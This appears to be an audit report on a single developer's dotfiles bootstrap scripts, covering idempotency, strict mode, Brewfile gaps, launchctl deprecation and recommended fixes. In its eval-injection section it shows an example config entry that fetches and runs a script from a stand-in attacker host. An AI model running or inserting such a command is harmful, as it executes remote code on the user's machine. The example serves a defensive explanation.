# Bootstrap & Installation Audit

> Adversarial audit of the bootstrap/installation domain in `/Users/leonardoacosta/dev/if`
> Generated: 2026-03-25
> Health Score: **FAIR**

---

## 1. Current Setup

### Script Inventory


| Script                          | Lines | Shebang               | `set -euo pipefail` | Sources utils.sh | Purpose                                                                                    |
| ------------------------------- | ----- | --------------------- | ------------------- | ---------------- | ------------------------------------------------------------------------------------------ |
| `install.sh`                    | 171   | `#!/usr/bin/env bash` | Yes                 | Yes              | Main interactive installer: OS detection, orchestrates all other scripts, creates symlinks |
| `scripts/prerequisites.sh`      | 31    | `#!/bin/bash`         | No                  | Yes (unquoted)   | Installs Xcode CLI tools and Homebrew                                                      |
| `scripts/brew-install.sh`       | 62    | `#!/bin/bash`         | No                  | Yes (unquoted)   | Runs `brew bundle` from Brewfile, installs Azure DevOps CLI extension                      |
| `scripts/osx-defaults.sh`       | 75    | `#!/bin/bash`         | No                  | Yes (unquoted)   | Applies macOS system preferences via `defaults write`                                      |
| `scripts/terminal.sh`           | 20    | `#!/bin/bash`         | No                  | Yes (unquoted)   | Creates `~/.hushlogin` to suppress login message                                           |
| `scripts/symlinks.sh`           | 157   | `#!/bin/bash`         | No                  | Yes (unquoted)   | Creates/deletes/previews symlinks from `symlinks.conf`                                     |
| `scripts/symlinks.conf`         | 34    | N/A (config)          | N/A                 | N/A              | Symlink source:target mappings, uses `$(pwd)` evaluated by `eval`                          |
| `scripts/utils.sh`              | 22    | `#!/bin/bash`         | No                  | N/A              | Color-coded output functions: `info`, `success`, `error`, `warning`                        |
| `scripts/install-arch.sh`       | 149   | `#!/usr/bin/env bash` | Yes                 | Yes (quoted)     | Arch Linux packages (pacman + AUR), Azure CLI, default shell                               |
| `scripts/mic-priority.sh`       | 65    | `#!/usr/bin/env bash` | Yes                 | N/A (standalone) | Sets microphone input priority via SwitchAudioSource                                       |
| `scripts/dbpro.sh`              | 83    | `#!/usr/bin/env bash` | Yes                 | Yes (quoted)     | Downloads and installs DB Pro DMG (arm64/x64 aware)                                        |
| `scripts/youtube-transcript.sh` | 97    | `#!/usr/bin/env bash` | Yes                 | Yes (quoted)     | Clones, builds, and installs `youtube_transcript` C tool from source                       |
| `scripts/ani-cli.sh`            | 48    | `#!/usr/bin/env bash` | Yes                 | Yes (quoted)     | Clones and installs ani-cli from source                                                    |
| `sync.sh`                       | 313   | `#!/bin/bash`         | `set -e` only       | No (own colors)  | Claude Code config sync: install/uninstall/promote/status for symlinked configs            |


**Total: 14 files, 1,327 lines** (including `symlinks.conf`)

---

## 2. Intent Analysis

The bootstrap system serves a single developer's multi-machine workflow across three platforms:

1. **macOS (primary)**: Full interactive installer with Homebrew, macOS defaults, symlinks, LaunchAgents, and optional tool installers.
2. **Arch Linux (homelab)**: Package installation via pacman/AUR, Azure CLI setup, default shell configuration.
3. **Windows (CloudPC)**: Handled separately in `windows/setup.ps1` (out of scope but noted).

The design philosophy is **interactive-first**: every major step requires a `read -p` confirmation. This prioritizes safety (human-in-the-loop) at the cost of automation capability.

The repository also serves as a **Claude Code configuration hub** via `sync.sh`, which is a separate concern from dotfiles bootstrapping but shares the same repo.

---

## 3. Cross-Domain Interactions


| From                 | To                      | Interface                        | Fragility                                                                                             |
| -------------------- | ----------------------- | -------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `install.sh`         | `prerequisites.sh`      | `source` (sourced, not executed) | **Low** -- functions called explicitly                                                                |
| `install.sh`         | `brew-install.sh`       | `source` (sourced)               | **Low** -- function `run_brew_bundle` called after user prompt                                        |
| `install.sh`         | `osx-defaults.sh`       | `source` (sourced)               | **Low** -- function `apply_osx_system_defaults` called after prompt                                   |
| `install.sh`         | `terminal.sh`           | `source` (sourced)               | **Low** -- function `terminal` called unconditionally                                                 |
| `install.sh`         | `youtube-transcript.sh` | `source` (sourced)               | **Medium** -- depends on `$DOTFILES` being set; runs `check_dependencies` at source time (line 95-97) |
| `install.sh`         | `dbpro.sh`              | `source` (sourced)               | **Low** -- depends on `$DOTFILES` being set                                                           |
| `install.sh`         | `ani-cli.sh`            | `source` (sourced)               | **Low** -- depends on `$DOTFILES` being set                                                           |
| `install.sh`         | `symlinks.sh`           | Executed as subprocess           | **Low** -- uses `$DOTFILES` path                                                                      |
| `install.sh`         | `symlinks.conf`         | Read by `symlinks.sh`            | **Medium** -- `eval` on `$(pwd)` expressions; assumes CWD = repo root                                 |
| `install.sh`         | `install-arch.sh`       | `source` (sourced)               | **High** -- runs `read -p` prompts at source time (lines 135-147), not gated by functions             |
| `install.sh`         | LaunchAgent plist       | `ln -sfn` + `launchctl load`     | **Medium** -- uses deprecated `launchctl load` API                                                    |
| `install.sh`         | WezTerm config          | `ln -sfn`                        | **Low** -- hardcoded in install.sh, not in symlinks.conf                                              |
| `symlinks.conf`      | All config dirs         | `eval echo` expansion            | **High** -- `$(pwd)` evaluated at parse time; code injection risk                                     |
| `mic-priority.plist` | `mic-priority.sh`       | LaunchAgent `ProgramArguments`   | **Medium** -- uses `$HOME` inside `/bin/bash -c` string; works but fragile                            |
| `brew-install.sh`    | Brewfile                | `brew bundle`                    | **Low** -- checks if satisfied before running                                                         |
| Brewfile             | Karabiner               | `cask "karabiner-elements"`      | **High** -- Karabiner is installed but config is never symlinked                                      |


---

## 4. Best Practices Audit

### 4.1 Idempotency

**Status: Partial -- significant gaps**


| Script                  | Idempotent? | Evidence                                                                                                                                                                                            |
| ----------------------- | ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `prerequisites.sh`      | Yes         | Checks `xcode-select -p` and `hash brew` before installing                                                                                                                                          |
| `brew-install.sh`       | Yes         | Runs `brew bundle check` first; skips if satisfied                                                                                                                                                  |
| `osx-defaults.sh`       | Yes         | `defaults write` is inherently idempotent                                                                                                                                                           |
| `terminal.sh`           | Yes         | `touch` is idempotent                                                                                                                                                                               |
| `symlinks.sh --create`  | **Partial** | Skips if symlink exists, but does NOT update if target changed. If a regular file exists at target, it warns and skips -- leaving stale config in place                                             |
| `symlinks.sh --delete`  | Yes         | Handles missing targets gracefully                                                                                                                                                                  |
| `install-arch.sh`       | Yes         | Checks `pacman -Qi` before each package                                                                                                                                                             |
| `dbpro.sh`              | **Partial** | Checks `/Applications/DB Pro.app` but prompts for reinstall; running twice triggers interactive prompt                                                                                              |
| `youtube-transcript.sh` | Yes         | Does `git pull --ff-only` on existing clone, rebuilds                                                                                                                                               |
| `ani-cli.sh`            | Yes         | Same clone-or-pull pattern                                                                                                                                                                          |
| `install.sh` (overall)  | **No**      | Safe to re-run but: LaunchAgent `launchctl load` may double-load if plist path changes; hardcoded WezTerm/LaunchAgent symlinks always overwrite via `ln -sfn` (fine) but skip logic is inconsistent |


**Key gap**: Running `install.sh` twice is safe but wasteful -- there is no "already configured, nothing to do" fast path. Every `read -p` prompt fires again regardless of current state.

References:

- [How to write idempotent Bash scripts](https://arslan.io/2019/07/03/how-to-write-idempotent-bash-scripts/)
- [Metaist/idempotent-bash](https://github.com/metaist/idempotent-bash)

### 4.2 Error Handling

**Status: Inconsistent -- two tiers of quality**

The codebase has a clear split between older scripts (`#!/bin/bash`, no strict mode) and newer scripts (`#!/usr/bin/env bash`, `set -euo pipefail`).


| Pattern                   | Older Scripts | Newer Scripts |
| ------------------------- | ------------- | ------------- |
| `set -e` (exit on error)  | No            | Yes           |
| `set -u` (undefined vars) | No            | Yes           |
| `set -o pipefail`         | No            | Yes           |
| `trap` (cleanup on exit)  | No            | No            |


**No script uses `trap`**. This is a problem for scripts that create temporary state:

- `dbpro.sh` mounts a DMG (line 55) but if the script fails between mount and unmount, the DMG stays mounted. A `trap` to `hdiutil detach` on `EXIT` would fix this.
- `youtube-transcript.sh` builds in a subshell (mitigates some risk) but does not clean up partial builds.

**Quoting inconsistency in `source` commands**:

```bash
# Older scripts (prerequisites.sh:6, brew-install.sh:6, osx-defaults.sh:6, symlinks.sh:8, terminal.sh:6):
. $SCRIPT_DIR/utils.sh       # UNQUOTED -- breaks if path contains spaces

# Newer scripts (install-arch.sh:7, dbpro.sh:7, youtube-transcript.sh:8, ani-cli.sh:7):
. "$DOTFILES/scripts/utils.sh"  # Quoted -- correct
```

While the dotfiles path (`~/dev/if`) does not contain spaces today, unquoted variable expansion is a latent bug and bad practice.

### 4.3 Shebang Inconsistency

**Status: Two conventions coexist with no apparent rationale**


| Shebang               | Scripts                                                                                                       |
| --------------------- | ------------------------------------------------------------------------------------------------------------- |
| `#!/bin/bash`         | `utils.sh`, `prerequisites.sh`, `brew-install.sh`, `symlinks.sh`, `osx-defaults.sh`, `terminal.sh`, `sync.sh` |
| `#!/usr/bin/env bash` | `install.sh`, `install-arch.sh`, `mic-priority.sh`, `dbpro.sh`, `youtube-transcript.sh`, `ani-cli.sh`         |


`#!/usr/bin/env bash` is the portable, recommended form. It resolves `bash` via `$PATH`, which matters on systems where `/bin/bash` is an old Apple-provided version (macOS ships bash 3.2 from 2007). The `#!/bin/bash` form hardcodes to the system bash.

On macOS with Homebrew, `brew install bash` installs bash 5.x to `/opt/homebrew/bin/bash`. Scripts using `#!/bin/bash` will still use the ancient 3.2 version, which lacks features like associative arrays and `${var,,}` case conversion.

**Verdict**: Pick `#!/usr/bin/env bash` and standardize.

### 4.4 Non-Interactive / CI Mode

**Status: Missing entirely**

Every major operation in `install.sh` is gated by `read -p`. There is no `--yes`, `--auto`, or `CI=true` mode. This means:

- Cannot run from a CI pipeline or automated provisioning
- Cannot use in a Dockerfile for consistent dev containers
- Cannot bootstrap a fresh machine unattended (e.g., after OS reinstall)

Additionally, `install-arch.sh` is **sourced** by `install.sh` (line 94), and its `read -p` prompts execute at source time (lines 135-147), not inside a gated function. This makes it impossible to selectively skip Arch prompts without modifying the script.

References:

- [Coder docs: Dotfiles](https://coder.com/docs/user-guides/workspace-dotfiles) -- "ensure your install script runs without requiring user interaction, otherwise the environment creation will hang"

---

## 5. Tool Choices

### Current Approach: Manual Shell Scripts

The repo uses a hand-rolled installer pattern: `install.sh` orchestrates platform-specific scripts that install packages, apply defaults, and create symlinks. This is the same pattern used by [mathiasbynens/dotfiles](https://github.com/mathiasbynens/dotfiles) (30K+ stars) and remains viable.

### Comparison Against Alternatives


| Criterion           | Current (Manual)               | chezmoi                                           | Dotbot                        | GNU Stow             | Ansible              |
| ------------------- | ------------------------------ | ------------------------------------------------- | ----------------------------- | -------------------- | -------------------- |
| Symlink management  | Custom `symlinks.sh` + conf    | Built-in                                          | YAML config                   | Directory convention | Tasks                |
| Cross-platform      | Manual `uname` checks          | Go templates (`{{ if eq .chezmoi.os "darwin" }}`) | `if` conditionals             | Manual               | Facts + conditionals |
| Secrets management  | ❌                              | age, 1Password, GPG, 15+ backends                 | ❌                             | ❌                    | Ansible Vault        |
| Templates           | ❌                              | Go `text/template`                                | ❌                             | ❌                    | Jinja2               |
| Idempotency         | Manual guards (partial)        | Built-in (always)                                 | Built-in                      | Built-in             | Built-in             |
| One-liner bootstrap | ❌                              | `chezmoi init --apply <repo>`                     | `dotbot -c install.conf.yaml` | `stow <pkg>`         | `ansible-playbook`   |
| Learning curve      | None (it's your code)          | Medium                                            | Low                           | Low                  | High                 |
| Maintenance burden  | High (you maintain everything) | Low                                               | Low                           | Low                  | Medium               |


### Assessment

The current approach is **adequate for a single developer** who understands every line. The ecosystem overview (already completed) identifies chezmoi as the clear frontrunner for 2026, and the gaps this audit finds -- inconsistent idempotency, no templating, no secrets, no non-interactive mode -- are all problems chezmoi solves out of the box.

However, migration to chezmoi is a **significant effort** (rewrite all symlinks.conf as chezmoi-managed files, convert platform conditionals to Go templates, learn chezmoi's apply model). The ROI depends on how often the bootstrap runs and how many machines it targets.

**Recommendation**: If the setup is stable and rarely re-run, stay with manual scripts but fix the issues identified here. If machines are frequently provisioned or the setup is growing, migrate to chezmoi.

---

## 6. Configuration Quality

### 6.1 symlinks.conf -- `eval` Security Concern

**File**: `/Users/leonardoacosta/dev/if/scripts/symlinks.conf`
**Lines**: 7-30 (all active entries)

Every line uses `$(pwd)` which is expanded via `eval echo` in `symlinks.sh` (lines 28-29, 73-74, 119):

```bash
source=$(eval echo "$source")
target=$(eval echo "$target")
```

**Risk**: If `symlinks.conf` is tampered with (or if a line contains shell metacharacters), `eval` will execute arbitrary commands. For example, a malicious entry like:

```
$(curl http://evil.com/pwn.sh | bash):$HOME/.zshrc
```

...would execute during `eval echo`. This is a [known eval injection pattern](https://owasp.org/www-community/attacks/Direct_Dynamic_Code_Evaluation_Eval%20Injection).

**Mitigation**: The file is version-controlled and only the owner edits it, so the practical risk is low. But `eval` is unnecessary here -- `envsubst` or direct variable substitution (`${DOTFILES}` instead of `$(pwd)`) would be safer.

**Recommended fix**: Replace `$(pwd)` with `$DOTFILES` in symlinks.conf, and replace `eval echo` with simple variable expansion in `symlinks.sh`:

```bash
# Instead of: source=$(eval echo "$source")
source="${source//\$DOTFILES/$DOTFILES}"
source="${source//\$HOME/$HOME}"
```

### 6.2 Brewfile -- Missing CLI Tools

The Brewfile installs 36 packages (brews + casks) but is **missing many CLI tools** that the zsh config (`load-tools.zsh`, `load-plugins.zsh`) and `install-arch.sh` depend on:


| Missing from Brewfile          | Referenced In                             | Available via Homebrew?                                      |
| ------------------------------ | ----------------------------------------- | ------------------------------------------------------------ |
| `fzf`                          | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "fzf"`)                                           |
| `zoxide`                       | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "zoxide"`)                                        |
| `atuin`                        | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "atuin"`)                                         |
| `bat`                          | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "bat"`)                                           |
| `eza`                          | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "eza"`)                                           |
| `ripgrep`                      | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "ripgrep"`)                                       |
| `fd`                           | `load-tools.zsh`, `install-arch.sh`       | Yes (`brew "fd"`)                                            |
| `direnv`                       | `load-tools.zsh`                          | Yes (`brew "direnv"`)                                        |
| `mise`                         | `load-tools.zsh`, `install-arch.sh` (AUR) | Yes (`brew "mise"`)                                          |
| `thefuck`                      | `load-tools.zsh`                          | Yes (`brew "thefuck"`)                                       |
| `lazygit`                      | `cmux-workspaces.sh`, `install-arch.sh`   | Yes (`brew "lazygit"`)                                       |
| `neovim`                       | `cmux-workspaces.sh`, `install-arch.sh`   | Yes (`brew "neovim"`)                                        |
| `git`                          | Everywhere                                | Yes (`brew "git"` -- Homebrew version is newer than Xcode's) |
| `gh` (GitHub CLI)              | `install-arch.sh`                         | Yes (`brew "gh"`)                                            |
| `zsh-history-substring-search` | `load-plugins.zsh`                        | Yes (`brew "zsh-history-substring-search"`)                  |
| `jq`                           | Referenced in README                      | Yes (`brew "jq"`)                                            |


This means a fresh macOS install via `brew bundle` will leave the shell config broken -- `load-tools.zsh` will skip tool initialization (it uses `command -v` guards), resulting in a degraded shell experience with no fzf, no zoxide, no bat aliases, etc. The user must manually install these tools to match what the zsh config expects.

**Verdict**: The Brewfile is severely incomplete. It covers apps and a few brews but misses the core CLI toolkit.

### 6.3 osx-defaults.sh -- Missing Restart Commands

**File**: `/Users/leonardoacosta/dev/if/scripts/osx-defaults.sh`

The script applies 20 `defaults write` commands affecting Finder, Dock, Spaces, and screenshots. However, it **never restarts the affected services**. Changes to Finder and Dock defaults require restarting those processes to take effect:

```bash
# Missing at end of function:
killall Finder 2>/dev/null || true
killall Dock 2>/dev/null || true
```

Without these, the user must manually restart Finder/Dock or log out and back in. The [mathiasbynens/dotfiles](https://github.com/mathiasbynens/dotfiles) `.macos` script (the canonical reference for macOS defaults) includes `killall` commands at the end for exactly this reason.

Additionally, some defaults may be deprecated or behave differently on macOS Sequoia (15.x). Notably:

- `com.apple.SoftwareUpdate ScheduleFrequency` -- Apple has moved software update scheduling to MDM profiles; this key may be ignored on modern macOS.
- The script uses `"OSX"` in function naming and UI text (`apply_osx_system_defaults`, `"OSX System Defaults"`) -- Apple rebranded from "OS X" to "macOS" in 2016.

References:

- [macos-defaults.com](https://macos-defaults.com/) -- interactive reference for all known defaults
- [kevinSuttle/macOS-Defaults](https://github.com/kevinSuttle/macOS-Defaults)

### 6.4 LaunchAgent -- Deprecated `launchctl load`

**File**: `/Users/leonardoacosta/dev/if/install.sh`, lines 153-154

```bash
launchctl load "$HOME/Library/LaunchAgents/com.leonardoacosta.mic-priority.plist" 2>/dev/null || true
```

`launchctl load` and `launchctl unload` are **legacy subcommands deprecated since macOS 10.10** (Yosemite). They may stop working in a future macOS release. The modern equivalents are:

```bash
# Load:
launchctl bootstrap gui/$(id -u) "$HOME/Library/LaunchAgents/com.leonardoacosta.mic-priority.plist"

# Unload:
launchctl bootout gui/$(id -u)/com.leonardoacosta.mic-priority
```

References:

- [MacRumors: launchctl legacy subcommands deprecated](https://forums.macrumors.com/threads/launchctl-legacy-subcommands-deprecated.2431281/)
- [Alan Siu: launchctl new subcommand basics](https://www.alansiu.net/2023/11/15/launchctl-new-subcommand-basics-for-macos/)

### 6.5 mic-priority.plist -- `$HOME` in ProgramArguments

**File**: `/Users/leonardoacosta/dev/if/launchd/com.leonardoacosta.mic-priority.plist`, line 12

```xml
<string>$HOME/dev/if/scripts/mic-priority.sh</string>
```

launchd does not perform variable expansion in plist values. However, this works here because the `$HOME` is inside a `/bin/bash -c` argument string, so bash expands it at runtime. This is **fragile but functional**. If someone changes the plist to use `Program` instead of `ProgramArguments` with `-c`, or removes the bash wrapper, `$HOME` would be treated as a literal string.

**Recommended fix**: Use the absolute path directly (e.g., `/Users/leonardoacosta/dev/if/scripts/mic-priority.sh`) or keep the bash wrapper but document why.

---

## 7. Architecture Assessment

### 7.1 Script Organization Pattern

The architecture follows a **hub-and-spoke model**: `install.sh` is the hub, sourcing spoke scripts that each handle one domain. This is clean and readable.

```
install.sh (hub)
  |-- prerequisites.sh     (Xcode + Homebrew)
  |-- brew-install.sh      (Brewfile)
  |-- osx-defaults.sh      (System preferences)
  |-- terminal.sh          (Hushlogin)
  |-- youtube-transcript.sh (Optional tool)
  |-- dbpro.sh             (Optional tool)
  |-- ani-cli.sh           (Optional tool)
  |-- symlinks.sh          (Symlink management)
  `-- install-arch.sh      (Linux alternative)
```

**Strength**: Each script can be run independently (direct-run guards via `basename` check).
**Weakness**: The sourcing model means install.sh's strict mode (`set -euo pipefail`) protects the hub, but the sourced scripts that lack their own strict mode inherit it inconsistently -- if a sourced script defines a function that is called later, the strict mode from install.sh applies. But if a sourced script has top-level code (like `install-arch.sh` lines 132-149), that code runs immediately during `source`, inside install.sh's error handling context, which may produce unexpected behavior.

### 7.2 Two-Tier Quality Split

There is a visible quality split between scripts written at different times:


| Tier               | Scripts                                                                                               | Characteristics                                                                           |
| ------------------ | ----------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Older** (tier 1) | `prerequisites.sh`, `brew-install.sh`, `osx-defaults.sh`, `terminal.sh`, `symlinks.sh`, `utils.sh`    | `#!/bin/bash`, no strict mode, unquoted `source`, `$SCRIPT_DIR` for path resolution       |
| **Newer** (tier 2) | `install.sh`, `install-arch.sh`, `mic-priority.sh`, `dbpro.sh`, `youtube-transcript.sh`, `ani-cli.sh` | `#!/usr/bin/env bash`, `set -euo pipefail`, quoted paths, `$DOTFILES` for path resolution |


This is not unusual in personal dotfiles (scripts evolve over time), but it creates cognitive load -- you must check each script's conventions before editing it.

### 7.3 Symlink Split: Config File vs. Hardcoded

Symlinks are managed in **two places** with no documented rationale:


| Location                     | Symlinks                                              |
| ---------------------------- | ----------------------------------------------------- |
| `symlinks.conf` (lines 7-30) | zsh, starship, tmux, ghostty, cmux-bridge LaunchAgent |
| `install.sh` (lines 139-157) | WezTerm, mic-priority LaunchAgent                     |


The commented-out entries in `symlinks.conf` (lines 24-29) explain the WezTerm and mic-priority plist split: they are "Mac only" and "handled by install.sh." But the Ghostty config (line 21) is also Mac-only and IS in symlinks.conf. The cmux-bridge plist (line 30) is also Mac-only and IS in symlinks.conf.

**Verdict**: The split is inconsistent. Either use `symlinks.conf` for all symlinks (with a platform column/filter) or put all platform-specific symlinks in `install.sh`. The current hybrid creates two places to check and two places to update.

---

## 8. Missing Capabilities


| Capability                                     | Impact                                                                                                                                                                                                                                                                  | Effort to Add                                                                        |
| ---------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| **Non-interactive mode** (`--yes` / `CI=true`) | Cannot automate provisioning; blocks CI/container use                                                                                                                                                                                                                   | Medium -- wrap `read -p` calls in a function that checks a flag                      |
| **Dry-run mode** (`--dry-run`)                 | Cannot preview what install.sh will do without running it                                                                                                                                                                                                               | Medium -- conditional execution wrappers                                             |
| **Karabiner config symlink**                   | Karabiner-Elements is installed via Brewfile but its config (`karabiner/mac_osx_on_rdp.json`) is never symlinked to `~/.config/karabiner/`                                                                                                                              | Low -- add to `symlinks.conf` or `install.sh`                                        |
| **Uninstall / rollback**                       | No way to reverse `install.sh` (remove symlinks, unload LaunchAgents, etc.)                                                                                                                                                                                             | Medium -- `symlinks.sh --delete` exists but nothing for LaunchAgents, defaults, etc. |
| **Version pinning for source-built tools**     | `youtube-transcript.sh` and `ani-cli.sh` build from `HEAD` of their repos -- no version pinning                                                                                                                                                                         | Low -- checkout a specific tag/commit                                                |
| **Logging**                                    | No installation log is created; if something fails silently, there is no record                                                                                                                                                                                         | Low -- `tee` output to a log file                                                    |
| **Health check / verify**                      | No post-install verification that everything works (shell startup, tools present, symlinks valid)                                                                                                                                                                       | Medium -- a `verify.sh` that checks all expected state                               |
| **Brewfile completeness**                      | 16+ CLI tools missing from Brewfile (see Section 6.2)                                                                                                                                                                                                                   | Low -- add entries to Brewfile                                                       |
| **Arch symlinks**                              | `install-arch.sh` installs packages but **does not call `symlinks.sh`** -- the user must run it separately or rely on `install.sh`'s final symlinks section. But `install-arch.sh` is also used standalone (direct-run guard), in which case symlinks are never created | Low -- call symlinks.sh at end of install-arch.sh                                    |
| `**killall Finder/Dock**` after osx-defaults   | Defaults changes don't take effect until processes restart                                                                                                                                                                                                              | Trivial                                                                              |


---

## 9. Redundancies

### 9.1 `sync.sh` Duplicates Color Functions

`sync.sh` (lines 14-18) defines its own color variables (`RED`, `GREEN`, `YELLOW`, `BLUE`, `NC`) and uses `echo -e` for colored output instead of sourcing `utils.sh`. This is a deliberate choice (sync.sh operates outside the DOTFILES context) but creates two divergent color systems:

- `utils.sh`: `tput`-based colors (more portable, works in non-ANSI terminals)
- `sync.sh`: ANSI escape codes via `echo -e` (simpler but less portable)

### 9.2 Azure DevOps Extension Install -- Duplicated

The Azure DevOps CLI extension is installed in **two places**:

- `scripts/brew-install.sh` line 36-48: `install_azure_devops_extension` function
- `scripts/install-arch.sh` lines 99-120: `install_azure_cli` function (includes extension)

Both check `az extension show --name azure-devops` and install if missing. The logic is identical. Could be extracted into `utils.sh` or a shared function.

### 9.3 `terminal.sh` -- Trivially Simple

`terminal.sh` is 20 lines to execute a single command: `touch ~/.hushlogin`. This could be a one-liner in `install.sh` instead of a separate script with its own `SCRIPT_DIR` resolution, utils sourcing, and direct-run guard.

### 9.4 `.DS_Store` Tracked in Git

`.DS_Store` is in `.gitignore` (line 41) but the root `.DS_Store` is tracked in git (confirmed via `git ls-files`). Additionally, `scripts/.DS_Store` exists on disk. The root one should be removed from tracking:

```bash
git rm --cached .DS_Store
```

---

## 10. Ambiguities

These are items where intent is unclear. Flagged, not guessed.


| Item                                       | Location                              | Ambiguity                                                                                                                                                                                                                                                                                                                                                                                                        |
| ------------------------------------------ | ------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **WezTerm commented out in Brewfile**      | `homebrew/Brewfile:86`                | `# cask "wezterm"` -- is WezTerm intentionally not installed via Homebrew? Is it installed manually? Or is Ghostty the replacement? The Brewfile has both Ghostty (active) and WezTerm (commented).                                                                                                                                                                                                              |
| **VS Code commented out in Brewfile**      | `homebrew/Brewfile:84`                | `# cask "visual-studio-code"` -- Same question. Cursor is active in Brewfile. Is VS Code deprecated in favor of Cursor?                                                                                                                                                                                                                                                                                          |
| **Git completions "legacy"**               | `symlinks.conf:32-34`                 | Commented out with note "legacy, kept for compatibility" -- compatibility with what? Are they still needed? The zsh completions directory (`zsh/completions/`) contains `_git` and `git-completion.bash` which are active.                                                                                                                                                                                       |
| `**install-arch.sh` as standalone**        | `scripts/install-arch.sh:29-30`       | It has a direct-run guard (`basename` check) but also runs top-level code at source time (lines 132-149). If sourced by `install.sh`, the top-level prompts execute during sourcing. Is standalone execution actually supported/tested?                                                                                                                                                                          |
| `**youtube-transcript.sh` auto-execution** | `scripts/youtube-transcript.sh:95-97` | Unlike other scripts, this one runs `check_dependencies` and `install_youtube_transcript` at the top level when sourced (not gated by direct-run guard). When sourced by `install.sh`, this code runs immediately. But `install.sh` calls `install_youtube_transcript` explicitly after a prompt (line 56). This means the tool would be installed twice: once at source time and once when the user says "yes." |
| **DB Pro version pinning**                 | `scripts/dbpro.sh:9`                  | `DBPRO_VERSION="1.6.1"` is hardcoded. Is this intentionally pinned to this version? How is it updated?                                                                                                                                                                                                                                                                                                           |
| **Cursor CLI install via pipe to bash**    | `install.sh:81`                       | `curl -fsSL https://cursor.com/install | bash` -- is this still the recommended install method? Pipe-to-bash is a known security concern (TOCTOU).                                                                                                                                                                                                                                                               |
| `**sync.sh` in bootstrap scope?**          | Root level                            | `sync.sh` manages Claude Code config symlinks for satellite projects. Is it part of the bootstrap flow or a separate operational tool? It is never called by `install.sh`.                                                                                                                                                                                                                                       |


---

## 11. Recommendations

### Critical (fix these -- they cause real problems)


| #   | Issue                                                                                                                                                                           | Location                              | Fix                                                                                                                                                                                           |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| C1  | **Brewfile missing 16+ CLI tools** -- fresh install leaves shell config broken                                                                                                  | `homebrew/Brewfile`                   | Add all tools listed in Section 6.2. This is the single highest-impact fix: without it, the installer produces an incomplete environment.                                                     |
| C2  | `**youtube-transcript.sh` executes at source time** -- `check_dependencies` + `install_youtube_transcript` run when the file is sourced by `install.sh`, before the user prompt | `scripts/youtube-transcript.sh:95-97` | Wrap lines 95-97 in a direct-run guard: `if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then ... fi`                                                                                                 |
| C3  | `**install-arch.sh` runs prompts at source time** -- `read -p` at lines 135-147 execute during `source`, not when explicitly called                                             | `scripts/install-arch.sh:132-149`     | Wrap the entire "Main installation flow" block (lines 132-149) in a function (e.g., `main_arch_install`) and call it from `install.sh` explicitly, matching the pattern used by other scripts |


### Important (should fix -- improve reliability and maintainability)


| #   | Issue                                                                        | Location                                                                                           | Fix                                                                                                                                          |
| --- | ---------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------- |
| I1  | `**eval` in symlinks.sh** -- unnecessary code injection surface              | `scripts/symlinks.sh:28-29,73-74,119`                                                              | Replace `$(pwd)` in `symlinks.conf` with `$DOTFILES`, replace `eval echo` with parameter expansion (`${source//\$DOTFILES/$DOTFILES}`)       |
| I2  | **Inconsistent shebangs** -- `#!/bin/bash` vs `#!/usr/bin/env bash`          | 6 scripts use `#!/bin/bash`                                                                        | Standardize on `#!/usr/bin/env bash` for all scripts                                                                                         |
| I3  | **Missing strict mode** in older scripts                                     | `prerequisites.sh`, `brew-install.sh`, `osx-defaults.sh`, `terminal.sh`, `symlinks.sh`, `utils.sh` | Add `set -euo pipefail` to all scripts                                                                                                       |
| I4  | **Unquoted `source` paths**                                                  | `prerequisites.sh:6`, `brew-install.sh:6`, `osx-defaults.sh:6`, `symlinks.sh:8`, `terminal.sh:6`   | Quote: `. "$SCRIPT_DIR/utils.sh"`                                                                                                            |
| I5  | **Deprecated `launchctl load`**                                              | `install.sh:154`                                                                                   | Replace with `launchctl bootstrap gui/$(id -u) "$plist_path"`                                                                                |
| I6  | **osx-defaults.sh missing `killall`**                                        | `scripts/osx-defaults.sh` (end of function)                                                        | Add `killall Finder 2>/dev/null || true; killall Dock 2>/dev/null || true`                                                                   |
| I7  | **Karabiner config never symlinked**                                         | Not present in `symlinks.conf` or `install.sh`                                                     | Add `$(pwd)/karabiner:$HOME/.config/karabiner` to `symlinks.conf` (or the appropriate subdirectory mapping)                                  |
| I8  | **Arch installer does not create symlinks** when run standalone              | `scripts/install-arch.sh`                                                                          | Add a call to `symlinks.sh --create` (or prompt for it) when run directly                                                                    |
| I9  | `**.DS_Store` tracked in git**                                               | Root `.DS_Store`                                                                                   | `git rm --cached .DS_Store`                                                                                                                  |
| I10 | **Symlink split** -- some in `symlinks.conf`, some hardcoded in `install.sh` | `install.sh:137-157`, `symlinks.conf`                                                              | Consolidate all symlinks into `symlinks.conf` with a platform filter mechanism (e.g., `# platform: darwin` comments parsed by `symlinks.sh`) |


### Nice-to-Have (improve the experience)


| #   | Issue                                         | Location                                                          | Fix                                                                                                                       |
| --- | --------------------------------------------- | ----------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------- |
| N1  | **No non-interactive mode**                   | `install.sh`                                                      | Add `--yes` / `--auto` flag; when set, skip all `read -p` prompts and assume "yes"                                        |
| N2  | **No `trap` for cleanup**                     | `dbpro.sh` (DMG mount), `youtube-transcript.sh` (build artifacts) | Add `trap cleanup EXIT` pattern for temporary resources                                                                   |
